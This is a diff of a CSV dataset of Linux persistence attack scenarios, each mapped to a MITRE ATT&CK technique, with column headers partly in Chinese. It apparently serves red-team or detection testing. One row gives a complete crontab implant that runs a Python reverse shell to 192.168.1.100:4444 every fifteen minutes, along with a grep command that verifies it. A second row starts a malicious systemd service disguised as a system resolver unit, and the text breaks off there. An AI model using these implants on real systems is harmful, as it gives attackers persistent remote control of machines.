@@ -1,4 +1,4 @@
-Scenario_ID,MITRE_ATT&CK_ID,ATT&CK_Technique,攻击描述,Session_A_植入(Implant),Session_C_触发验证(Trigger),持久化类型
+Scenario_ID,MITRE_ATT&CK_ID,ATT&CK_Technique,Attack Description,Session_A_(Implant),Session_B(Trigger),持久化类型
 HC-T1053-003,T1053.003,Scheduled Task/Job: Cron,通过crontab植入Python反弹shell定时任务,"(crontab -l 2>/dev/null; echo ""*/15 * * * * /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\\""192.168.1.100\\"",4444));subprocess.call([\\""bash\\"",\\""-i\\""],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"") | crontab -","crontab -l | grep -E 'python3.*socket.*4444'",Scheduled Task
 HC-T1543-002,T1543.002,Create or Modify System Process: Systemd Service,创建伪装为系统解析服务的恶意systemd服务,"cat > /etc/systemd/system/dbus-org.freedesktop.resolve1.service << 'EOF'
 [Unit]
